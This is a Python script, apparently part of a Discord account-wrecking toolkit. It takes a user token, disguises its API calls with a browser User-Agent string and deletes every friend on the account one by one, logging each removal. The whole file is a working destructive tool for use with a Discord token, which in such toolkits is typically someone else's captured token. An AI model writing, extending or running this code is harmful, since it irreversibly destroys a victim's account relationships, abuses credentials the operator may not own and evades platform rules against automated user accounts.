
import requests
import time
from colorama import Fore, Style

def getheaders(token):
    return {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }

def new_title(title):
    print(f"\n{Fore.CYAN}{'='*50}")
    print(f"{Fore.YELLOW}{title.center(50)}")
    print(f"{Fore.CYAN}{'='*50}{Fore.RESET}\n")

def deleteFriends(token):
    """Delete all Discord friends"""
    new_title("Friend Deleter")
    
    try:
        friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=getheaders(token)).json()
        for friend in friendIds:
            try:
                response = requests.delete(
                    f'https://discord.com/api/v9/users/@me/relationships/{friend["id"]}', 
                    headers=getheaders(token)
                )
                
                if response.status_code == 204:
                    username = friend['user'].get('username', 'Unknown')
                    discriminator = friend['user'].get('discriminator', '0000')
                    print(f"{Fore.GREEN}[+] {Fore.LIGHTCYAN_EX}Friend={Fore.WHITE}{username}#{discriminator}{Fore.RESET} {Fore.LIGHTBLACK_EX}[{Fore.GREEN}REMOVED{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
                else:
                    print(f"{Fore.RED}[-] Failed to remove friend: {response.status_code}{Fore.RESET}")
                
                time.sleep(0.5)  # Rate limiting
                
            except Exception as e:
                print(f"{Fore.RED}[-] Error removing friend: {e}{Fore.RESET}")
                
    except Exception as e:
        print(f"{Fore.RED}[-] Delete friends failed: {e}{Fore.RESET}")
